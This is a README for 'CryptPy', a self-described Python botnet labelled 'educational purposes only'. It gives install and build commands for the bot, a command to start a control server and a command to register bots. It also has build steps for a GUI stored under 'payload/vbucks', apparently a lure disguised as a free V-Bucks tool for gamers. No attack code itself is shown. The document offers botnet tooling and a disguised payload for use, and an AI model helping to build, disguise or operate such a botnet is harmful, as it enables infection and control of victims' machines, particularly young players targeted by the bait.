![Logo](http://mattnappo.com/crypt.png)

[![Build Status](https://travis-ci.com/dowlandaiello/CryptPy.js.svg?branch=master)](https://travis-ci.com/dowlandaiello/CryptPy.js)
[![As Seen On](https://img.shields.io/badge/As%20Seen%20On-GitHub,%20PyPi,%20NPM,%20Google%20Chrome-brightgreen.svg)](https://img.shields.io/badge/As%20Seen%20On-GitHub-brightgreen.svg)
___

Agile Python botnet (educational purposes only).

## Installation

### Core Installation with PIP (Botnet Sources)

```BASH
pip install cryptpy
```

### Building the Python Source (Botnet Sources)

note: requires pyinstaller

```BASH
pyinstaller --onefile main.py
```

### Building the Node Source (GUI Implementation)

Note: requires installation of cryptpy

First, `cd payload/vbucks`.

Build for MacOS:

1. `npm i`

2. `yarn dist`

Build for Windows:

1. `npm i`

2. `npm run dist`

## Usage

Start a Server:

```bash
cryptpy --server --terminal
```

Start and Register a Bot:

```bash
cryptpy
```
